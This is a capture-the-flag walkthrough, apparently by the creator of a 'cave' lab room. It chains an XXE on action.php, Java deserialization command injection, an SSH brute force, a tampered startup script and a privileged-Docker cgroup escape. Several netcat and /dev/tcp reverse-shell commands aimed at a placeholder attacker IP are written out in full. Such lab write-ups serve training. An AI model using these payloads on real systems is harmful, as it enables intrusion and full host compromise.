---
layout: default
---
# You're in a cave official Writeup

## Enumeration

First we'll start scanning ports with nmap.

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Document
2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3333/tcp open  dec-notes?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay, there's ssh running on port 2222, a http server on port 80 and a weird service running on port 3333.

Let's take a look at this service running on port 3333.

When we connect to it we receive this:
```
  You find yourself in a cave, what do you do?
```

If we try to write some things it says that nothing happens, maybe this is buffer overflow? Lets see the web server to see if we can find something.

When we connect to the webserver we are greeted with a text written "What do you do?" and an input, what we put into the input gets posted to action.php, but we don't get anything, doesn't matter what we write.

Lets try to see directories in the webserver, i'll run gobuster with the common.txt file, here's the output:

```
===============================================================
2020/08/28 10:34:47 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.hta.txt (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
/matches (Status: 200)
/search (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/28 10:37:25 Finished
===============================================================
```

There are these two interesting pages, /matches and /search, both of them have a base64 encoded string. If we decode them, it looks like it's something written for java.

They are serialized objects and this search could be something that an RPG character could try to do, isn't it? Also these are serialized objects, so maybe we can try to go back to that service running on port 3333 and see if we can get something from it.

If we go to the service and write search we get this output:
```
You can't see anything, the cave is very dark.
```
Now the output for matches:
```
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.
```
Wow, interesting, the output is clearly encoded in those pages, and also, the matches command told us we are in /home/cave/src, interesting.

So let's try to enumerate a bit more with gobuster with a different wordlist and while we wait for the output, let's take a better look into action.php page.

If we see the request made to it, it returns a 400 status code, so there is something wrong with the request. Let's intercept the request with burp and try to tinker with it.

Okay, what are the options we have to change in this broken request? Not much, but we can play with the headers, but which header has the correct information we need to change? Well if we try to think of things that can make a request be malformed, one of them would be the content-type being wrong and theres a well known web vulnerability that is called XML External Entity, so lets try to change Content-Type header to application/xml, we can see an error popping up in the response:

```
Start tag expected, '<' not found
```

Okay, now it's obvious, let's try for XXE, i'll send a payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) and we can read /etc/passwd, okay good, but maybe there are some more interesting files we can read.

Let's go back to the output of our gobuster that we left running some time ago:

```
===============================================================
2020/08/28 11:07:09 Starting gobuster
===============================================================
/search (Status: 200)
/attack (Status: 200)
/lamp (Status: 200)
/matches (Status: 200)
/walk (Status: 200)
```

Oh, new commands for our service running on port 3333 let's see their outputs:
```
attack: You punch the wall, nothing happens.
walk: There's nowhere to go.
lamp: You grab a lamp, and it gives enough light to search around
      Action.class
      RPG.class
      RPG.java
      Serialize.class
      commons-io-2.7.jar
      run.sh
```

Oh, the lamp showed us something interesting... Maybe we can try to read the RPG.java using the XXE from action.php, since we have the path and the filename.

{% highlight java %}
import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}
{% endhighlight %}

Okay, reading the java code we can see that the service works like this:
Tt gets your input and sends it as a request to the webserver like this `https://cave.thm/<input>`, then it gets the response and deserializes it (as you noticed the pages have serialized objects), then it gets the command variable of the object and passes it in the command /bin/sh -c "`<command>`" so, if you manipulate the command part of a serialized object you have remote code execution.

Now, we're able to create a serialized object using the code we got from RPG.java, the only thing we need to do is manipulate the response to make the java code deserialize it. We know that the page is vulnerable to XXE and the hint says, sometimes things that work with post can work with get, with XXE we can reflect anything we send, so if we try sending a request to `/action.php?<xml>[serializedobject]</xml>` we get the serialized object back and as we know, the service running on port 3333 sends our input to the webserver, so if we send `action.php?<xml>[serializedobject]</xml>` as input to the service, the response will be [serializedobject] and it will be deserialized, executing any command we want it to

So we need to give an object to execute a command in the machine.

First let's make this serialized object, luckily for you (if you don't like java), the code already has a function to serialize objects, so let's use that function.

Lets modify the main function with this:

{% highlight java %}
public static void main(String[] args) {                                                                                                  
        try{                                                                                                                                  
            String str = Serialize.toString( new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR_VPN_IP] 1234 >/tmp/f;echo \"") );                                                                                                                        
            System.out.println( "abc : " + str );                                                                                                                                                                        
        }catch(Exception e){                                                                                                                  
            System.out.println("aa");                                                                                                         
        }                                                                                                                                     
    }
{% endhighlight %}

Also remove this line import org.apache.commons.io.IOUtils; now compile and run the code to get the serialized object:

```
$ javac RPG.java
$ java RPG
abc : [base64EncodedObject]
```

Okay, we have the object, now let's send our payload!

So let's setup a netcat listener and then try sending `action.php?<xml>[serializedobject]</xml>` to the service.
We get a reverse shell in the machine.

Let's go to our user's home directory, there's a file called info.txt:

```
After getting information from external entities, you saw that one part of the wall was different from the rest, when touching it, it revealed a wooden door without a keyhole.
On the door it is carved the following statement:

              The password is in
              [REDACTED-REGEX]
```

Okay we get our first flag. Now what can we do with this?
This is a regex statement and the file says that the password is in there, so maybe we can make a wordlist out of the regex and try to brute force the door user.

I searched on google how to make a wordlist from regex and found [this](https://www.sjoerdlangkemper.nl/2017/05/10/generating-password-list-with-regexes/). This site speaks about a tool named exrex.py, I used it to make the wordlist.

```
exrex -o passwords "[REDACTED-REGEX]"
```

Then i used hydra to bruteforce it:

```
hydra -l door -P passwords [REMOTE_IP] ssh -s 2222 -vV
```

After some minutes, hydra finds the password and we can go on with our quest.

When we get to door, there are 3 files in the home directory info.txt  oldman.gpg  skeleton, let's cat info.txt

```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
It looks like the skeleton doesn't want to let anyone pass through.
```

Okay, now the oldman.gpg is an encrypted file and lets try to execute skeleton.

```
You cannot defeat the skeleton with your current items, your inventory is empty.
```

Maybe you get a different output if you used su instead of connecting from ssh because if we decode the lamp file we can see the following output:

```
srActionM;LcommandtLjava/lang/String;Lnameq~Loutputq~xptaYou grab a lamp, and it gives enough light to search around
`ls;export INVENTORY=lamp:$INVENTORY`t
```

It is exporting lamp into the INVENTORY environment variable, so now we know what is our inventory, but what do we need in the inventory to defeat the skeleton?

Let's go back to oldman.gpg, we need a private key to decrypt the message, enumerating the machine we can see that there is a folder called adventurer inside /var/www that we don't have access to, but www-data has access, so maybe that folder is a subdomain?
Since we read RPG.java we know that the machine is using the domain cave.thm, so let's add adventurer.cave.thm to our /etc/hosts file and see if there is something different.

There is a file called adventurer.priv inside it, let's wget it onto the machine.

Now we have the private key, if we try to gpg --import adventurer.priv, it asks for a password, we dont know the password.
If we look the hint in for this task, it is saying "Take a second look in the text files", but if we cat info.txt there is nothing interesting in it, lets try to edit it.

```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
The private key password is [REDACTED-PRIVATE-KEY-PASSWORD] ^[[A
It looks like the skeleton doesn't want to let anyone pass through.
```

If we try to edit it with any editor, or if we cat it using cat -v info.txt we can see that the file has a ^[[A that get escaped by cat and it hides the line, so now we have the password for the private key, let's decrypt the message.

```
$ gpg --import adventurer.priv
$ gpg --output message --no-tty oldman.gpg
$ cat message
IT'S DANGEROUS TO GO ALONE! TAKE THIS [REDACTED-ITEM]
```

Let's add the [REDACTED-ITEM] to the inventory using export INVENTORY=[REDACTED-ITEM] and then execute the skeleton.

```
$ export INVENTORY=[REDACTED-ITEM]
$ ./skeleton
skeleton:[REDACTED-PASSWORD]
```

Let's su into the skeleton.
It has a info.txt file, let's read it:

```
After successfully defeating the skeleton with the [REDACTED-ITEM] you went forward.
In front of you there's a big opening and after it there's a huge tree that seems magical, you can feel the freedom!
But although you can see it, you can't go to it because there's an invisible wall that keeps you from getting to the root of the tree.
```

Let's check our sudo privileges as the skeleton

```
$ sudo -l
Matching Defaults entries for skeleton on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User skeleton may run the following commands on localhost:
    (root) NOPASSWD: /bin/kill
```

We can use /bin/kill, there is nothing about it in [GTFOBins](https://gtfobins.github.io) so let's enumerate more.
If we go to /opt there is a different directory there called link and if we list it we can see:

```
skeleton@cave:/opt/link$ ls -la
total 8
drwxrwxrwx 2 root     root     4096 Aug 28 00:00 .
drwxr-xr-x 1 root     root     4096 Aug 27 23:59 ..
lrwxrwxrwx 1 skeleton skeleton   16 Aug 27 23:55 startcon -> ../root/start.sh
```

There is a file linked to ../root/start.sh, but there is no root directory in /opt, but there is one in /, lets move this file to /tmp.

```
$ mv ./startcon /tmp
$ cd /tmp
$ cat startcon
#!/bin/bash

service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"

/bin/bash
```

This looks like a file that executes when the system starts and if we cat /proc/1/cgroup, we can see that we are inside a docker container.

If we try to edit this file, we can see that we can do it, so i added a bash -i >& /dev/tcp/[YOUR_VPN_IP]/1234 0>&1 to the file and then started a netcat listener in my machine.

Now we need to know how to restart a docker container from the inside, searching on the web i found out that, to stop a docker container from inside, you need to kill the proccess with the PID 1. We can kill processes.

Now we can go on killing off all processes until the container stops.

When the container stops, we get a connection in our listener.

Lets go to /root, there we have a info.txt:

```
You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
You could feel the cave rumbling, like it was the end for you and then all went black.
But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.

You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.

Flag:[REDACTED]
```

Okay, we are in a container, we know that, now we need to escape.

Searching how to escape docker containers I stumbled upon [this post](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1), we can see that we are indeed in a privileged container, so following the instructions in it we can execute any command we want, so let's try to get a reverse shell in the host machine.

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR_VPN_IP] 5555 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now we are root in the outside, lets go to /root and cat the info.txt file:

```
You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.

Flag:[REDACTED]
```

Hope you liked it, i had a lot of fun making this room :D
